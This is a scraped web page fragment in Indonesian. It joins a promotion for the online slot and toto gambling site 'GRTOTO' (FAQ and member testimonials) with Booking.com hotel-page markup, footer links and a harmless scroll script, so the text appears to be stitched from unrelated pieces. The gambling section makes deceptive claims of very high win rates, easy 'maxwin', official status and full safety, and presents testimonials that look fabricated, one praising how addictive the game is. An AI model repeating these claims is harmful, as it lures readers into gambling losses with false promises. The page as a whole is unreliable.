                                                <p style="text-align: justify;"><span style="color: #ff0000;"><strong>GRTOTO</strong></span> hadir sebagai platform resmi bandar slot online hari ini, dirancang dengan keamanan terjamin supaya para pemain bisa menikmati permainan lebih nyaman.</p>
                                          </div>
                                       </div>
                                    </div>
                                </div>
                            </div>
<style>
  .fr {
    max-width: 1200px; /* lebih besar dan landscape */
    margin: 40px auto;
    padding: 50px;
    border-radius: 18px;
    background: #000000;
    border: 2px solid #c70202e3;
    box-shadow: 0 0 25px rgba(255, 0, 0, 0.3);
    font-family: "Poppins", sans-serif;
    color: #000000;
    position: relative;
    overflow: hidden;
  }

  .fr h2 {
    text-align: center;
    font-size: 32px;
    color: #da0000ce;
    text-shadow: 0 0 6px rgba(165, 18, 18, 0.596);
    margin-bottom: 30px;
    letter-spacing: 1px;
  }

  .gf {
    max-width: 950px;
    margin: 0 auto 50px;
  }

  .fr details {
    background: #ffffff;
    border-radius: 12px;
    margin-bottom: 16px;
    padding: 18px 22px;
    border: 1px solid #000102;
    transition: 0.3s ease;
  }

  .fr details:hover {
    box-shadow: 0 0 14px #ffffff;
    transform: translateY(-2px);
  }

  .fr summary {
    cursor: pointer;
    font-size: 18px;
    font-weight: 600;
    color: #000000;
  }

  .fr details p {
    margin-top: 12px;
    font-size: 16px;
    line-height: 1.7;
  }

  /* Testimoni */
  .testimoni-wrapper {
    display: grid;
    grid-template-columns: 1fr 1fr; /* landscape, 2 kolom */
    gap: 25px;
    margin-top: 40px;
  }

  .fr blockquote {
    background: #ffffff;
    border-left: 5px solid #d40505e0;
    border-radius: 12px;
    padding: 22px 26px;
    min-height: 160px;
    position: relative;
    box-shadow: 0 0 14px rgba(255, 238, 2, 0.2);
    transition: 0.3s;
  }

  .fr blockquote:hover {
    transform: translateY(-4px);
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
  }

  .fr blockquote::before {
    content: "“";
    font-size: 60px;
    color: rgba(7, 7, 7, 0.35);
    position: absolute;
    top: 0;
    left: 15px;
    font-family: serif;
  }

  .fr cite {
    display: block;
    margin-top: 18px;
    font-weight: bold;
    color: #000000;
    text-align: right;
  }

  /* Footer link */
  .seller-name__detail {
    margin-top: 45px;
    text-align: center;
    grid-column: span 2;
  }

  .seller-name__detail a {
    color: #ffffff;
    font-weight: bold;
    font-size: 1.2em;
    text-decoration: none;
    text-shadow: 0 0 8px rgb(143, 143, 143);
  }

  /* Efek shine */
  .fr::before {
    content: "";
    position: absolute;
    top: 0;
    left: -150%;
    width: 50%;
    height: 100%;
    background: linear-gradient(
      120deg,
      rgba(167, 139, 250, 0) 0%,
      rgba(200, 183, 255, 0.33) 50%,
      rgba(167, 139, 250, 0) 100%
    );
    transform: skewX(-20deg);
    animation: shine 3s infinite;
    mix-blend-mode: screen;
    pointer-events: none;
  }

  @keyframes shine {
    0% { left: -150%; }
    100% { left: 150%; }
  }
  
</style>


<div class="fr">
  <h2>FAQ GRTOTO</h2>

  <div class="gf">
    <details>
      <summary>Apa itu GRTOTO Bandar Toto Slot Online Hari ini?</summary>
      <p>GRTOTO merupakan bandar toto slot online resmi yang nawarin potensi raih maxwin hari ini. Hadirkan sistem premium dengan winrate kemenangan yang sangat tinggi, semua pengguna dapat menikmati setiap spin lebih optimal tanpa ribet.</p>
    </details>

    <details>
      <summary>Mengapa harus memilih GRTOTO?</summary>
      <p>GRTOTO menawarkan berbagai keuntungan: proses deposit cepat via QRIS, WD instan, bonus harian, dan fitur slot gacor yang siap meningkatkan peluang menang. Cocok buat pemain baru maupun yang sudah berpengalaman.</p>
    </details>

    <details>
      <summary>Apakah GRTOTO aman dan terpercaya?</summary>
      <p>Sangat aman. GRTOTO menggunakan teknologi enkripsi terbaru, server stabil, serta tim CS 24 jam siap membantu pemain. Semua transaksi dan data dijaga dengan ketat agar pengalaman bermain tetap nyaman.</p>
    </details>

    <details>
      <summary>Berapa minimal deposit di GRTOTO</summary>
      <p>Mulai dari Rp5.000 saja, kamu sudah bisa menikmati berbagai game slot gacor dengan peluang maxwin tinggi. Modal kecil tetap bisa meraih kemenangan besar setiap hari.</p>
    </details>

    <details>
      <summary>Apa keunggulan GRTOTO dibanding situs slot lain?</summary>
      <p>Keunggulan GRTOTO meliputi RTP tinggi, koleksi game lengkap, server stabil, fitur prediksi dan statistik untuk membantu menang, serta bonus dan promo rutin yang menambah keseruan bermain slot gacor.</p>
    </details>
  </div>

  <h2>Testimoni Member</h2>

  <div class="testimoni-wrapper">
    <blockquote>
        Main di GRTOTO bikin ketagihan, bandar slot toto resmi gampang maxwin, dan proses WD selalu cepat tanpa ribet.
        <cite>- Surmin</cite>
    </blockquote>
    <blockquote>
        Baru daftar langsung bisa rasain jackpot! Penarikan instan, pengalaman mainnya top banget.
        <cite>- Wakci</cite>
    </blockquote>
    <blockquote>
        GRTOTO jadi favorit saya karena semua pembayaran lancar, server stabil, dan slot gacor setiap hari.
        <cite>- Sambi</cite>
    </blockquote>
    <blockquote>
        Banyak pilihan game slot gacor dan layanan CS ramah. Cocok buat main santai maupun serius.
        <cite>- Raru</cite>
    </blockquote>
    <blockquote>
        RTP tinggi, game stabil, dan tidak ada kendala saat WD. Situs slot online terpercaya dan resmi Slot777.
        <cite>- Kabar</cite>
    </blockquote>
    <blockquote>
        Sudah lama main di GRTOTO, selalu konsisten bayar, bonus rutin, dan peluang maxwin besar tiap putaran.
        <cite>- Syahdu</cite>
    </blockquote>
    <div class="seller-name__detail" data-spm="seller">
        
      <a href="#" target="_self">GRTOTO Situs Toto Slot Online</a>
    </div>
  </div>
</div>
<div class="room-lightbox-failure js-room-lightbox-failure-message g-hidden">
Terjadi kesalahan. Harap coba lagi nanti.
</div>
</div>
</div>
<div class="js-async-room-lightbox-reserve"></div>
</div>
</div>
</div>
<script nonce="cH3DZKVyvb8x5Uh">
;(function() {
'use strict';
if(document && document.addEventListener && document.querySelectorAll) {
var BUTTON_SELECTOR = '.book_now_button_handler';
var reserveButtons = document.querySelectorAll(BUTTON_SELECTOR);
reserveButtons = Array.prototype.slice.call(reserveButtons);
if(reserveButtons && reserveButtons.length) {
reserveButtons.forEach(function(button) {
button.addEventListener('click', goToAvailabilityBlock);
});
document.addEventListener('DOMContentLoaded', function() {
reserveButtons.forEach(function(button) {
button.removeEventListener('click', goToAvailabilityBlock);
});
});
}
}
function goToAvailabilityBlock() {
if(window.history && window.history.replaceState) {
var uri = window.location.toString();
if (uri.indexOf("#") > 0) {
var uriWithoutHash = uri.substring(0, uri.indexOf("#"));
window.history.replaceState({}, document.title, uriWithoutHash);
}
}
var RT_SELECTOR = '.hp-section-header';
var roomsTable = document.querySelector(RT_SELECTOR);
if(roomsTable) {
window.scrollTo(0, roomsTable.offsetTop);
}
}
})();
</script>
</div>
<div data-et-view="cCHObCBWaVRHFBdcEUDJKaZUTPdKNKNKWe:2"></div>
<div class="page-section k2-hp--banners">
<div
class="js-k2-hp--block page-section--inner-spacing k2-hp--brazil_right_to_cancel_banner"
>
</div>

</div>
</div>
</li>
</ul>
</div>
</div>
<a
href=""
class="c-media-card-carousel__show-more-button bui-link"
data-carousel-show-more-footer
style="display: none;"
 target="_blank"
>
Selengkapnya
</a>
</div>
</div>
</div>
</div>
</div>
<div data-capla-component-boundary="b-property-web-property-page/PropertyPageInterlinking"><div class="d5a9e3a8c0"><div class="e5c685dfd4"><button data-testid="best-of-property-accordion" class="cec0620c60" type="button" aria-expanded="false" aria-controls=":R14tH1:" id=":R14t:"><span class="d10f6911f7"><div class="ecb8d66605"><div class="b08850ce41 f546354b44 cc045b173b"><div class="da8a6fe12c">Yang terbaik di Yogyakarta</div></div><div class="fff1944c52 fb14de7f14 fdf31a9fa1">Klik di sini untuk melihat hotel dan akomodasi lain yang dekat dengan landmark populer di Yogyakarta</div></div></span><span class="fc70cba028 e19912385b c2a70a5db2 bc7d708ceb" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="50px"><path d="M19.268 8.913a.9.9 0 0 1-.266.642l-6.057 6.057A1.3 1.3 0 0 1 12 16c-.35.008-.69-.123-.945-.364L4.998 9.58a.91.91 0 0 1 0-1.284.897.897 0 0 1 1.284 0L12 13.99l5.718-5.718a.897.897 0 0 1 1.284 0 .88.88 0 0 1 .266.642"></path></svg></span></button><div class="fd8f72d6ed" style="overflow:hidden"><div aria-labelledby=":R14t:" role="region" class="f92d48f0f7" hidden="" id=":R14tH1:"><div style="--bui_stack_spaced_gap--s:24" class="f6e3a11b0d a19a26a18c e95943ce9b"><div class=""><div style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d ae5dbab14d e95943ce9b"><div class="b08850ce41">Kota</div><ul class="e3e9b33c14"><li class="e3e076eb4e"><a href="https://www.booking.com/city/id/medan.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 e0d8514d4d"><span>Medan</span></a></li><li class="e3e076eb4e"><a href="https://www.booking.com/city/id/berastagi.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 e0d8514d4d"><span>Berastagi</span></a></li><li class="e3e076eb4e"><a href="https://www.booking.com/city/id/tebingtinggi.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 e0d8514d4d"><span>Tebingtinggi</span></a></li><li class="e3e076eb4e"><a href="https://www.booking.com/city/id/sunggal.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 e0d8514d4d"><span>Sunggal</span></a></li></ul></div></div><div class=""><div style="--bui_stack_spaced_gap--s:2" class="f6e3a11b0d ae5dbab14d e95943ce9b"><div class="b08850ce41">Bandara</div><ul class="e3e9b33c14"><li class="e3e076eb4e"><a href="https://www.booking.com/airport/id/kno.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b&amp;aid=356980" class="de576f5064 bef8628e61 e0d8514d4d"><span>Kualanamu International Airport</span></a></li></ul></div></div></div></div></div></div></div></div>
<div id="calendar"></div>
<a class="back_to_top border4" id="back_to_top" href="#" style="display: none;" title="Kembali ke atas">
<img class="back_to_top_arrow" src="https://cf.bstatic.com/static/img/transparent/85e02501df1560d359a473f544224481a83c9aa7.png" alt="" />
</a>
<input type="hidden" id="bp_hp_back_count" name="bp_hp_back_count" value="0">
<div data-capla-component-boundary="b-property-web-property-page/LandingPagesEtTracking"></div>
<div class="slinks">
</div>
<div
id="footer_menu_track"
class="footerconstraint cnd-onview-anchor footer_no_lang_track a11y_fix_footer_contrast_footerconstraint "
role="contentinfo"
>
<div data-et-view="GaYZQOEIBOOOSVBPLREHGJeaILYJO:1"></div>
<div data-capla-component-boundary="b-property-web-property-page/TravellerFooter"><div><div class="web-shell-footer-mfe e661b22b91 a39fb30ec1" data-testid="web-shell-footer-mfe"><footer class="TravellerFooter_root--variant-full" data-testid="full-footer"><div class="TravellerFooter_inline-links-list--light" data-testid="seo-links"><div style="--bui_mixin_spaced_padding-block-start--s:4;--bui_mixin_spaced_padding-block-end--s:4" class="b7ef425131 TravellerFooter_inline-links-list--content e65bb8178d b5f4517f4e"><nav aria-label="Link cepat"><ul style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d a19a26a18c e95943ce9b"><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/country.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Negara</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/region.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Kawasan</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/city.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Kota</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/district.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Distrik</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/airport.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Bandara</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/hotel/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Hotel</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a rel="nofollow" href="https://www.booking.com/landmark.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Landmark</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/booking-home/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Rumah liburan</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/apartments/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Apartemen</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/resorts/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Resor</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/villas/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Vila</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/hostels/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Hostel</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/bed-and-breakfast/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">B&amp;B</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/guest-house/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Guest House</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/accommodations.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Tempat istimewa untuk menginap</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/reviews.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Ulasan</div></span></a></li><li class=" TravellerFooter_inline-links-list-item"><a href="https://www.booking.com/extended-stays/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><div class="fff1944c52">Temukan akomodasi bulanan</div></span></a></li></ul></nav></div></div><div data-testid="footer-lists" style="--bui_mixin_spaced_padding-block-start--s:4;--bui_mixin_spaced_padding-block-end--s:4" class="b7ef425131 TravellerFooter_footer-lists e65bb8178d b5f4517f4e"><div style="--bui_stack_spaced_gap--s:6" class="f6e3a11b0d a19a26a18c dcb3e09ec9 e95943ce9b"><div data-testid="footer-group_support" style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d ae5dbab14d e95943ce9b TravellerFooter_footer-lists--list"><div class="ecb8d66605"><h3 class="b08850ce41 f546354b44 cc045b173b">Dukungan</h3></div><ul class="e9f7361569 b049f18dec"><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/covid_19.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pertanyaan Umum mengenai Coronavirus (COVID-19)</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://secure.booking.com/content/cs.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Kelola trip Anda</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://secure.booking.com/help.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Hubungi Customer Service</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/trust_and_safety.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Pusat informasi keamanan</span></span></a></div></li></ul></div><div data-testid="footer-group_discover" style="--bui_stack_spaced_gap--s:3" class="f6e3a11b0d ae5dbab14d e95943ce9b TravellerFooter_footer-lists--list"><div class="ecb8d66605"><h3 class="b08850ce41 f546354b44 cc045b173b">Telusuri</h3></div><ul class="e9f7361569 b049f18dec"><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/genius.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Program loyalitas Genius</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a href="https://www.booking.com/deals/index.id.html?label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=763c41d2c3813906f2527013f103b837&amp;aid=356980" class="de576f5064 bef8628e61 b2067e75a6"><span><span class="b99b6ef58f">Promo liburan dan musiman</span></span></a></div></li><li class="b0bf4dc58f b2f588b43c b14a6d9e99 ee817a4ef2"><div><a 